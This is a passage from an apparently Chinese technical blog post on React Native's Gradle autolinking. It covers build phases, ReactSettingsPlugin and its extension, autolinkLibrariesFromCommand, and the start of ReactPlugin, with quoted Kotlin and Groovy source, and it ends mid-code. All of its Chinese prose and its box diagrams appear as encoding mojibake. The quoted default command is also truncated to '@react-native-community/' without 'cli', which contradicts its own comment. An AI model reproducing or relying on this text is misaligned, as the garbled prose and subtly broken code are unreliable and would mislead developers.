<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ <span class="hljs-number">1</span>. Initialization é˜¶æ®µ                                          â”‚
â”‚    - ç¡®å®šå‚ä¸æ„å»ºçš„é¡¹ç›®                                          â”‚
â”‚    - ä¸ºæ¯ä¸ªé¡¹ç›®åˆ›å»º Project å®ä¾‹                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-number">2</span>. Settings é˜¶æ®µ â† ReactSettingsPlugin åœ¨è¿™é‡Œæ‰§è¡Œ               â”‚
â”‚    - è§£æ settings<span class="hljs-selector-class">.gradle</span>(.kts)                                â”‚
â”‚    - åº”ç”¨ Settings Plugin                                       â”‚
â”‚    - æ‰§è¡Œ <span class="hljs-built_in">autolinkLibrariesFromCommand</span>()                       â”‚
â”‚    - ç”Ÿæˆ autolinking<span class="hljs-selector-class">.json</span>                                     â”‚
â”‚    - åŠ¨æ€æ·»åŠ å­é¡¹ç›® (settings.include)                          â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-number">3</span>. Configuration é˜¶æ®µ â† ReactPlugin åœ¨è¿™é‡Œæ‰§è¡Œ                  â”‚
â”‚    - è§£ææ‰€æœ‰ build<span class="hljs-selector-class">.gradle</span>(.kts)                               â”‚
â”‚    - åº”ç”¨ Project Plugin                                        â”‚
â”‚    - æ³¨å†Œä»»åŠ¡ (configureAutolinking)                           â”‚
â”‚    - åˆ›å»ºä»»åŠ¡å›¾ï¼ˆTask Graphï¼‰                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ <span class="hljs-number">4</span>. Execution é˜¶æ®µ â† GeneratePackageListTask åœ¨è¿™é‡Œæ‰§è¡Œ          â”‚
â”‚    - æ‰§è¡Œä»»åŠ¡                                                   â”‚
â”‚    - ç”Ÿæˆæ„å»ºäº§ç‰©                                               â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p>Settings Plugin çš„ç‰¹ç‚¹ï¼š</p>
<ul>
<li>
<p>é¡¹ç›®ç»“æ„æ§åˆ¶ï¼šå¯ä»¥åŠ¨æ€å†³å®šå“ªäº›é¡¹ç›®å‚ä¸æ„å»º</p>
</li>
<li>
<p>æ—©æœŸä»‹å…¥ï¼šåœ¨ä»»ä½• Project Plugin æ‰§è¡Œå‰å°±å®Œæˆå·¥ä½œ</p>
</li>
<li>
<p>å…¨å±€è§†è§’ï¼šèƒ½å¤Ÿè®¿é—®æ•´ä¸ªæ„å»ºçš„ Settings å¯¹è±¡</p>
</li>
<li>
<p>ä¾èµ–å‘ç°ï¼šé€‚åˆåšè‡ªåŠ¨ä¾èµ–å‘ç°å’Œé“¾æ¥</p>
</li>
</ul>
<h5 data-id="heading-11">ReactSettingsPlugin</h5>
<p>ReactSettingsPlugin æ˜¯ Autolinking æœºåˆ¶çš„æ ¸å¿ƒå…¥å£ç‚¹ï¼Œå®ƒé€šè¿‡ Gradle Settings Plugin æœºåˆ¶åœ¨é¡¹ç›®é…ç½®çš„æœ€æ—©é˜¶æ®µä»‹å…¥ï¼Œå®Œæˆä¸‰æ–¹åº“çš„è‡ªåŠ¨å‘ç°å’Œé“¾æ¥ã€‚</p>
<p>ReactSettingsPlugin æ¶æ„å±‚æ¬¡ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Gradle Settings Plugin å±‚                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ReactSettingsPlugin (æ’ä»¶å…¥å£)                                  â”‚
â”‚   â†“                                                             â”‚
â”‚ ReactSettingsExtension (åŠŸèƒ½å®ç°)                              â”‚
â”‚   â†“                                                             â”‚
â”‚ <span class="hljs-built_in">autolinkLibrariesFromCommand</span>() (æ ¸å¿ƒæ–¹æ³•)                      â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h6 data-id="heading-12">æ’ä»¶æ³¨å†Œ</h6>
<p>æºç <code>react-native/packages/gradle-plugin/settings-plugin/build.gradle.kts</code></p>
<pre><code class="hljs language-groovy" lang="groovy">gradlePlugin {
  plugins {
    create("react.settings") {
      id = "com.facebook.react.settings"                    // â† æ’ä»¶ ID
      implementationClass = "com.facebook.react.ReactSettingsPlugin"  // â† å®ç°ç±»
    }
  }
}
</code></pre>
<h6 data-id="heading-13">æ’ä»¶æ ¸å¿ƒå®ç°</h6>
<p>æºç <code>react-native/packages/gradle-plugin/settings-plugin/src/main/kotlin/com/facebook/react/ReactSettingsPlugin.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactSettingsPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Settings</span>&gt; {
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(settings: <span class="hljs-type">Settings</span>)</span></span> {
    <span class="hljs-comment">// å…³é”®ï¼šæ³¨å†Œ ReactSettingsExtension æ‰©å±•</span>
    settings.extensions.create(
        <span class="hljs-string">"reactSettings"</span>,                    <span class="hljs-comment">// â† æ‰©å±•åç§°</span>
        ReactSettingsExtension::<span class="hljs-keyword">class</span>.java, <span class="hljs-comment">// â† æ‰©å±•å®ç°ç±»</span>
        settings                            <span class="hljs-comment">// â† æ³¨å…¥ Settings å®ä¾‹</span>
    )
  }
}
</code></pre>
<ul>
<li><strong>Settings Plugin</strong>ï¼šåœ¨ Gradle Settings é˜¶æ®µæ‰§è¡Œï¼Œæ—©äºæ‰€æœ‰ Project Plugin</li>
<li><strong>Extension æ³¨å†Œ</strong>ï¼šåˆ›å»º <code>reactSettings</code> æ‰©å±•ï¼Œä¾› <code>settings.gradle</code> è°ƒç”¨</li>
<li><strong>ä¾èµ–æ³¨å…¥</strong>ï¼šå°† <code>Settings</code> å®ä¾‹æ³¨å…¥åˆ° <code>ReactSettingsExtension</code> ä¸­</li>
</ul>
<p>ç»§ç»­æŸ¥çœ‹å®ç°ç±»<code>react-native/packages/gradle-plugin/settings-plugin/src/main/kotlin/com/facebook/react/ReactSettingsExtension.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactSettingsExtension</span> <span class="hljs-meta">@Inject</span> <span class="hljs-keyword">constructor</span>(<span class="hljs-keyword">val</span> settings: Settings) {

  <span class="hljs-comment">// è¾“å‡ºæ–‡ä»¶è·¯å¾„</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> outputFile =
      settings.layout.rootDirectory.file(<span class="hljs-string">"build/generated/autolinking/autolinking.json"</span>).asFile

  <span class="hljs-comment">// ç¼“å­˜ç›®å½•</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> outputFolder =
      settings.layout.rootDirectory.file(<span class="hljs-string">"build/generated/autolinking/"</span>).asFile

  <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> defaultConfigCommand: List&lt;String&gt; =
      windowsAwareCommandLine(listOf(<span class="hljs-string">"npx"</span>, <span class="hljs-string">"@react-native-community/"</span>, <span class="hljs-string">"config"</span>)).map {
        it.toString()
      }

  <span class="hljs-comment">/**
   * ä½¿ç”¨å¤–éƒ¨å‘½ä»¤ä½œä¸ºæƒå¨æ•°æ®ï¼Œä»è€Œå®ç°è‡ªåŠ¨é“¾æ¥åº“çš„å·¥å…·å‡½æ•°ã€‚
   *
   * æ­¤æ–¹æ³•åº”åœ¨ `settings.gradle` æ–‡ä»¶ä¸­è°ƒç”¨ï¼Œå®ƒä¼šç¡®ä¿ Gradle é¡¹ç›®åŠ è½½æ‰€æœ‰å‘ç°çš„åº“ã€‚
   *
   * <span class="hljs-doctag">@param</span> command è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”¨äºè·å–è‡ªåŠ¨é“¾æ¥é…ç½®ã€‚é»˜è®¤ä¸º
   *   `npx <span class="hljs-doctag">@react</span>-native-community/cli config`ã€‚
   * <span class="hljs-doctag">@param</span> workingDirectory æ‰§è¡Œå‘½ä»¤çš„å·¥ä½œç›®å½•ã€‚
   * <span class="hljs-doctag">@param</span> lockFiles è¦æ£€æŸ¥å˜åŒ–çš„é”æ–‡ä»¶åˆ—è¡¨ï¼ˆå¦‚æœé”æ–‡ä»¶æ²¡æœ‰å˜åŒ–ï¼Œåˆ™ä¸ä¼šæ‰§è¡Œå‘½ä»¤ï¼‰ã€‚
   */</span>
  <span class="hljs-meta">@JvmOverloads</span>
  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">autolinkLibrariesFromCommand</span><span class="hljs-params">(
      command: <span class="hljs-type">List</span>&lt;<span class="hljs-type">String</span>&gt; = defaultConfigCommand,
      workingDirectory: <span class="hljs-type">File</span>? = settings.layout.rootDirectory.dir(<span class="hljs-string">"../"</span>)</span></span>.asFile,
      lockFiles: FileCollection =
          settings.layout.rootDirectory
              .dir(<span class="hljs-string">"../"</span>)
              .files(<span class="hljs-string">"yarn.lock"</span>, <span class="hljs-string">"package-lock.json"</span>, <span class="hljs-string">"package.json"</span>, <span class="hljs-string">"react-native.config.js"</span>),
  ) {
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šåˆ›å»ºè¾“å‡ºç›®å½•</span>
    outputFile.parentFile.mkdirs()

    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šåˆ›å»ºå‘½ä»¤æ‰§è¡Œé…ç½®</span>
    <span class="hljs-keyword">val</span> updateConfig =
        <span class="hljs-keyword">object</span> : GenerateConfig {
          <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">command</span><span class="hljs-params">()</span></span>: List&lt;String&gt; = command

          <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
            <span class="hljs-comment">// æ‰§è¡Œ React Native CLI å‘½ä»¤</span>
            <span class="hljs-keyword">val</span> execResult = settings.providers.exec { exec -&gt;
                  exec.commandLine(command)  <span class="hljs-comment">// â† æ‰§è¡Œ npx @react-native-community/cli config</span>
                  exec.workingDir = workingDirectory  <span class="hljs-comment">// â† è®¾ç½®å·¥ä½œç›®å½•</span>
                }
            <span class="hljs-comment">// å°† CLI è¾“å‡ºå†™å…¥ autolinking.json</span>
            outputFile.writeText(execResult.standardOutput.asText.<span class="hljs-keyword">get</span>())
            <span class="hljs-keyword">return</span> execResult.result.<span class="hljs-keyword">get</span>().exitValue
          }
        }

    <span class="hljs-comment">// ç¬¬ä¸‰æ­¥ï¼šæ£€æŸ¥ç¼“å­˜å¹¶æ›´æ–°é…ç½®</span>
    checkAndUpdateCache(updateConfig, outputFile, outputFolder, lockFiles)

    <span class="hljs-comment">// ç¬¬å››æ­¥ï¼šé“¾æ¥å‘ç°çš„åº“</span>
    linkLibraries(getLibrariesToAutolink(outputFile))
  }
  <span class="hljs-comment">// çœç•¥â€¦â€¦</span>
}
</code></pre>
<p>æ£€æŸ¥ç¼“å­˜å¹¶æ›´æ–°é…ç½®ä¸»è¦æ˜¯é€šè¿‡SHAè®¡ç®—å’Œæ£€æŸ¥é”æ–‡ä»¶å®ç°ã€‚è¿™é‡Œæˆ‘ä»¬é‡ç‚¹ç ”ç©¶ä¸€ä¸‹ç¬¬å››æ­¥é“¾æ¥å‘ç°çš„åº“ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// æå–å¯é“¾æ¥çš„åº“</span>
<span class="hljs-keyword">internal</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getLibrariesToAutolink</span><span class="hljs-params">(buildFile: <span class="hljs-type">File</span>)</span></span>: Map&lt;String, File&gt; {
    <span class="hljs-keyword">val</span> model = JsonUtils.fromAutolinkingConfigJson(buildFile)  <span class="hljs-comment">// â† è§£æ JSON é…ç½®</span>
    <span class="hljs-keyword">return</span> model
        ?.dependencies
        ?.values
        <span class="hljs-comment">// è¿‡æ»¤ï¼šåªå¤„ç†æœ‰ Android é…ç½®çš„ä¾èµ–</span>
        ?.filter { it.platforms?.android?.sourceDir != <span class="hljs-literal">null</span> }
        <span class="hljs-comment">// è¿‡æ»¤ï¼šè·³è¿‡çº¯ C++ ä¾èµ–ï¼ˆæ²¡æœ‰ .gradle æ–‡ä»¶ï¼‰</span>
        ?.filterNot { it.platforms?.android?.isPureCxxDependency == <span class="hljs-literal">true</span> }
        <span class="hljs-comment">// æ˜ å°„ï¼šé¡¹ç›®å -&gt; æºç ç›®å½•</span>
        ?.associate { deps -&gt;
            <span class="hljs-string">":<span class="hljs-subst">${deps.nameCleansed}</span>"</span> to File(deps.platforms?.android?.sourceDir)
        } ?: emptyMap()
}

<span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">linkLibraries</span><span class="hljs-params">(input: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, File&gt;)</span></span> {
    input.forEach { (path, projectDir) -&gt;
        settings.include(path)                    <span class="hljs-comment">// â† åŒ…å«å­é¡¹ç›®åˆ° Gradle æ„å»º</span>
        settings.project(path).projectDir = projectDir  <span class="hljs-comment">// â† è®¾ç½®é¡¹ç›®ç›®å½•</span>
    }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œé“¾æ¥åº“æ—¶ç”¨åˆ°äº†ä¹‹å‰æ³¨å…¥çš„<code>Settings</code>å®ä¾‹ï¼Œå°†ä¾èµ–çš„é‚£äº›ä¸‰æ–¹åº“ä¸€ä¸ªä¸ªæ·»åŠ åˆ°å®¿ä¸»å·¥ç¨‹ä¸­ã€‚</p>
<h6 data-id="heading-14">æ’ä»¶çš„å¼•å…¥</h6>
<p>æˆ‘ä»¬ä»¥React Nativeæºç å·¥ç¨‹æä¾›çš„<strong>helloworld</strong>é¡¹ç›®ä¸ºä¾‹ï¼Œçœ‹ä¸€ä¸‹è¿™ä¸ªgradleæ’ä»¶æ˜¯æ€ä¹ˆè¢«å¼•å…¥çš„ï¼Œæºç <code>react-native/private/helloworld/android/settings.gradle</code></p>
<pre><code class="hljs language-groovy" lang="groovy">pluginManagement { 
    includeBuild("../../../packages/gradle-plugin") 
}
plugins { 
    id("com.facebook.react.settings")  // â† åº”ç”¨ ReactSettingsPlugin
}
extensions.configure(com.facebook.react.ReactSettingsExtension) { ex -&gt; 
    ex.autolinkLibrariesFromCommand()  // â† è°ƒç”¨ autolinking æ–¹æ³•
}
</code></pre>
<h6 data-id="heading-15">å®Œæ•´è°ƒç”¨æµç¨‹å›¾</h6>
<pre><code class="hljs language-css" lang="css">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é˜¶æ®µ <span class="hljs-number">1</span>: Gradle Settings è§£æ                                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ settings.gradle è§£ææ—¶ï¼š                                         â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ <span class="hljs-number">1</span>. åº”ç”¨ ReactSettingsPlugin                              â”‚   â”‚
â”‚ â”‚    â†“                                                      â”‚   â”‚
â”‚ â”‚ <span class="hljs-number">2</span>. æ³¨å†Œ ReactSettingsExtension                           â”‚   â”‚
â”‚ â”‚    â†“                                                      â”‚   â”‚
â”‚ â”‚ <span class="hljs-number">3</span>. è°ƒç”¨ <span class="hljs-built_in">autolinkLibrariesFromCommand</span>()                   â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                  â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é˜¶æ®µ <span class="hljs-number">2</span>: ç¼“å­˜æ£€æŸ¥å’Œ CLI æ‰§è¡Œ                                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ <span class="hljs-built_in">checkAndUpdateCache</span>():                                          â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ <span class="hljs-number">1</span>. <span class="hljs-built_in">isCacheDirty</span>() æ£€æŸ¥ç¼“å­˜æ˜¯å¦å¤±æ•ˆ                        â”‚   â”‚
â”‚ â”‚    - æ£€æŸ¥ autolinking.json æ˜¯å¦å­˜åœ¨                       â”‚   â”‚
â”‚ â”‚    - æ£€æŸ¥é”æ–‡ä»¶ SHA æ˜¯å¦å˜åŒ–                               â”‚   â”‚
â”‚ â”‚    - æ£€æŸ¥é…ç½®æ¨¡å‹æ˜¯å¦æœ‰æ•ˆ                                  â”‚   â”‚
â”‚ â”‚                                                           â”‚   â”‚
â”‚ â”‚ <span class="hljs-number">2</span>. å¦‚æœç¼“å­˜å¤±æ•ˆï¼Œæ‰§è¡Œ updateConfig.<span class="hljs-built_in">execute</span>()              â”‚   â”‚
â”‚ â”‚    - æ‰§è¡Œ npx @react-native-community/cli config         â”‚   â”‚
â”‚ â”‚    - å°†è¾“å‡ºå†™å…¥ autolinking.json                          â”‚   â”‚
â”‚ â”‚    - æ›´æ–°é”æ–‡ä»¶ SHA ç¼“å­˜                                   â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                                  â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ é˜¶æ®µ <span class="hljs-number">3</span>: åº“å‘ç°å’Œé“¾æ¥                                             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                 â”‚
â”‚ <span class="hljs-built_in">linkLibraries</span>(<span class="hljs-built_in">getLibrariesToAutolink</span>()):                       â”‚
â”‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚
â”‚ â”‚ <span class="hljs-number">1</span>. JsonUtils.<span class="hljs-built_in">fromAutolinkingConfigJson</span>() è§£æ JSON       â”‚   â”‚
â”‚ â”‚    - æ¸…ç† CLI è¾“å‡ºä¸­çš„è°ƒè¯•ä¿¡æ¯                             â”‚   â”‚
â”‚ â”‚    - ååºåˆ—åŒ–ä¸º ModelAutolinkingConfigJson                â”‚   â”‚
â”‚ â”‚                                                           â”‚   â”‚
â”‚ â”‚ <span class="hljs-number">2</span>. <span class="hljs-built_in">getLibrariesToAutolink</span>() æå–å¯é“¾æ¥åº“                  â”‚   â”‚
â”‚ â”‚    - è¿‡æ»¤æœ‰ Android é…ç½®çš„ä¾èµ–                             â”‚   â”‚
â”‚ â”‚    - è·³è¿‡çº¯ C++ ä¾èµ–                                       â”‚   â”‚
â”‚ â”‚    - æ˜ å°„é¡¹ç›®ååˆ°æºç ç›®å½•                                  â”‚   â”‚
â”‚ â”‚                                                           â”‚   â”‚
â”‚ â”‚ <span class="hljs-number">3</span>. <span class="hljs-built_in">linkLibraries</span>() å®é™…é“¾æ¥                               â”‚   â”‚
â”‚ â”‚    - settings.<span class="hljs-built_in">include</span>(path) åŒ…å«å­é¡¹ç›®                    â”‚   â”‚
â”‚ â”‚    - settings.<span class="hljs-built_in">project</span>(path).projectDir = dir è®¾ç½®ç›®å½•     â”‚   â”‚
â”‚ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h5 data-id="heading-16">ReactPlugin</h5>
<p>ä¸ ReactSettingsPlugin ä¸åŒï¼Œå®ƒæ˜¯ä¸€ä¸ªProject Pluginã€‚è¯¥æ’ä»¶æ˜¯åœ¨Gradle Configuration é˜¶æ®µæ‰§è¡Œï¼Œè´Ÿè´£ä»»åŠ¡æ³¨å†Œå’Œæ„å»ºé…ç½®ã€‚</p>
<p>å…¶æ ¸å¿ƒèŒè´£æ˜¯ï¼š</p>
<ul>
<li><strong>æ’ä»¶åˆå§‹åŒ–</strong>ï¼šåˆ›å»º <code>ReactExtension</code> é…ç½®æ‰©å±•</li>
<li><strong>å¤šé¡¹ç›®åè°ƒ</strong>ï¼šç®¡ç† App å’Œ Library é¡¹ç›®çš„ä¸åŒé…ç½®</li>
<li><strong>ä»»åŠ¡æ³¨å†Œ</strong>ï¼šæ³¨å†Œ Autolinkingã€Codegen ç­‰å…³é”®ä»»åŠ¡</li>
<li><strong>AGP é›†æˆ</strong>ï¼šä¸ Android Gradle Plugin æ·±åº¦é›†æˆ</li>
<li><strong>ä¾èµ–é…ç½®</strong>ï¼šè¯»å– ReactSettingsPlugin çš„è¾“å‡ºå¹¶è¿›è¡Œåç»­å¤„ç†</li>
</ul>
<p>æºç <code>react-native/packages/gradle-plugin/react-native-gradle-plugin/src/main/kotlin/com/facebook/react/ReactPlugin.kt</code></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ReactPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Project</span>&gt; {
  <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(project: <span class="hljs-type">Project</span>)</span></span> {
    <span class="hljs-comment">// ç¬¬ä¸€æ­¥ï¼šJVM ç‰ˆæœ¬æ£€æŸ¥</span>
    checkJvmVersion(project)

    <span class="hljs-comment">// ç¬¬äºŒæ­¥ï¼šåˆ›å»º ReactExtension é…ç½®æ‰©å±•</span>
    <span class="hljs-comment">// è¿™å…è®¸ç”¨æˆ·åœ¨ build.gradle ä¸­ä½¿ç”¨ react { ... } é…ç½®å—</span>
    <span class="hljs-keyword">val</span> extension = project.extensions.create(<span class="hljs-string">"react"</span>, ReactExtension::<span class="hljs-keyword">class</span>.java, project)

